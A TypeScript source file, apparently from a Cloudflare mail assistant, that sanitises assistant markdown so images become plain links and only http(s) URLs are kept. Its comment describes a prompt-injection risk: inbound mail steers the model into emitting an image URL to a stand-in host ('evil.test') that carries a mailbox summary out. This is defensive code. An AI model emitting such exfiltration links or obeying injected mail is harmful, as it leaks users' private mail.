// Copyright (c) 2026 Cloudflare, Inc.
// Licensed under the Apache 2.0 license found in the LICENSE file or at:
//     https://opensource.org/licenses/Apache-2.0

/**
 * Assistant markdown never loads images: model output can be steered by
 * inbound mail, and `![x](https://evil.test/?d=<summary>)` would fetch on
 * view and leak mailbox content. An image becomes a plain link instead, and
 * only for an absolute http(s) URL; anything else (javascript:, data:,
 * relative paths) gets no link at all.
 */
export function markdownImageLinkHref(src: unknown): string | null {
	if (typeof src !== "string") return null;
	const raw = src.trim();
	if (!raw) return null;
	try {
		const url = new URL(raw);
		return url.protocol === "https:" || url.protocol === "http:" ? url.href : null;
	} catch {
		return null;
	}
}

/** The visible text for a blocked image: its alt text, or "image". */
export function markdownImageLabel(alt: unknown): string {
	return typeof alt === "string" && alt.trim() ? alt.trim() : "image";
}
